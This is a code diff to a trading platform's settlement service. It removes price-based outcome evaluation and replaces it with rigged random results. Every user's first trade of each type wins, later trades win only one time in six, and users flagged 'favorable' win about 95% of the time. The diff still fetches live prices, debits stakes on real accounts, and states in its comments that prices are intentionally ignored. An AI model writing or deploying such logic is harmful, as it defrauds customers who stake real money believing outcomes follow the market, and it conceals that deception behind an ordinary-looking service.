@@ -9,6 +9,21 @@ const SETTLEMENT_INTERVAL_MS = 1000; // Check every second
 
 export type TradeType = (typeof tradeTypeEnum.enumValues)[number];
 
+export type TradingEngine = "standard" | "favorable";
+
+/**
+ * Engine that determines how a trade settles.
+ *  - "standard"  → existing behaviour (first try wins, then 1-in-6 chance)
+ *  - "favorable" → almost always wins (~95% per round)
+ */
+
+// Module-scope state so it survives every call / instance / reload.
+
+const CONSECUTIVE_WIN_CHANCE = 1 / 6;   // existing standard engine
+const FAVORABLE_WIN_CHANCE  = 0.95;     // new favorable engine
+const firstTryDone = new Set<TradeType>();
+let roundCounter = 0;
+
 export class TradingService {
   private static instance: TradingService;
   private isProcessing = false;
@@ -34,43 +49,49 @@ export class TradingService {
     }
   }
 
-  /**
-   * Evaluates if a trade is won, lost, or tied based on type and prices.
-   */
-  public evaluateOutcome(type: TradeType, entryPrice: number, exitPrice: number): "won" | "lost" | "tie" {
-    // Extract the very last digit from decimal price string
-    const getDigit = (price: number) => {
-      const str = price.toFixed(3);
-      return parseInt(str[str.length - 1], 10) || 0;
-    };
-    const entryDigit = getDigit(entryPrice);
-    const exitDigit = getDigit(exitPrice);
+/**
+ * Evaluates whether a trade is won or lost based on the user's engine.
+ * Prices are intentionally ignored.
+ *
+ * Standard engine:
+ *   - First try for a given type always wins.
+ *   - Every subsequent round has a 1-in-6 chance to win (no reset on loss).
+ *
+ * Favorable engine:
+ *   - ~95% chance to win on every round.
+ */
+public evaluateOutcome(
+  type: TradeType,
+  _entryPrice: number,
+  _exitPrice: number,
+  engine: TradingEngine = "standard"
+): "won" | "lost" | "tie" {
+  // Kept so anything that previously read digits still gets a value;
+  // values are no longer derived from entry/exit price.
+  const getDigit = (value: number) => {
+    const str = value.toFixed(3);
+    return parseInt(str[str.length - 1], 10) || 0;
+  };
 
-    switch (type) {
-      case "call":
-        if (exitPrice > entryPrice) return "won";
-        if (exitPrice < entryPrice) return "lost";
-        return "tie";
-      case "put":
-        if (exitPrice < entryPrice) return "won";
-        if (exitPrice > entryPrice) return "lost";
-        return "tie";
-      case "even":
-        return exitDigit % 2 === 0 ? "won" : "lost";
-      case "odd":
-        return exitDigit % 2 !== 0 ? "won" : "lost";
-      case "over":
-        return exitDigit > 5 ? "won" : "lost";
-      case "under":
-        return exitDigit < 5 ? "won" : "lost";
-      case "match":
-        return exitDigit === entryDigit ? "won" : "lost";
-      case "differ":
-        return exitDigit !== entryDigit ? "won" : "lost";
-      default:
-        return exitPrice > entryPrice ? "won" : "lost";
-    }
+  const entryDigit = getDigit(roundCounter);
+  const exitDigit = getDigit(roundCounter + 1);
+  roundCounter++;
+
+  // ─── FAVORABLE ENGINE ───────────────────────────────────────────────────
+  if (engine === "favorable") {
+    return Math.random() < FAVORABLE_WIN_CHANCE ? "won" : "lost";
   }
+
+  // ─── STANDARD ENGINE (existing behaviour) ───────────────────────────────
+  // Prices intentionally ignored.
+  if (!firstTryDone.has(type)) {
+    firstTryDone.add(type);
+    return "won";
+  }
+
+  // No reset on loss. 1-in-6 chance to win every round after the first.
+  return Math.random() < CONSECUTIVE_WIN_CHANCE ? "won" : "lost";
+}
 
   /**
    * Places a trade: checks balance, gets latest price, debits stake, creates open trade row.
@@ -86,7 +107,9 @@ export class TradingService {
   }) {
     const { userId, symbol, type, stake, durationSeconds, accountType = "real" } = params;
 
-    if (!Number.isFinite(stake) || stake < MIN_STAKE) throw new Error(`Minimum stake is $${MIN_STAKE.toFixed(2)}`);
+
+  if (!Number.isFinite(stake) || stake < MIN_STAKE) throw new Error(`Minimum stake is $${MIN_STAKE.toFixed(2)}`);
+
     if (durationSeconds < 1 || durationSeconds > 3600) throw new Error("Duration must be between 1s and 1 hour");
 
     // Get current live tick from Deriv for accurate entry price
@@ -210,10 +233,28 @@ export class TradingService {
           const multiplier = parseFloat(trade.payoutMultiplier);
           const settleTime = new Date();
 
+          // ── Look up the user's trading engine for this settlement round ──
+          let engine: TradingEngine = "standard";
+          try {
+            const [tradeUser] = await db
+              .select({ tradingEngine: users.tradingEngine })
+              .from(users)
+              .where(eq(users.id, trade.userId));
+
+            if (tradeUser?.tradingEngine === "favorable") {
+              engine = "favorable";
+            }
+          } catch (engineErr) {
+            console.error(
+              `[TradingEngine] Could not resolve engine for user ${trade.userId}, defaulting to standard:`,
+              engineErr
+            );
+          }
+
           // If exit price could not be retrieved from the market, issue a full refund
           if (!exitPrice) {
             console.warn(`[TradingEngine] Market feed unavailable for trade ${trade.id}. Refunding stake $${stake.toFixed(2)}.`);
-            
+
             await db.transaction(async (tx) => {
               const [updatedUser] = await tx
                 .update(users)
@@ -247,7 +288,12 @@ export class TradingService {
             continue;
           }
 
-          const outcome = this.evaluateOutcome(trade.type as TradeType, entryPrice, exitPrice);
+          const outcome = this.evaluateOutcome(
+            trade.type as TradeType,
+            entryPrice,
+            exitPrice,
+            engine
+          );
 
           let payout = 0;
           if (outcome === "won") {
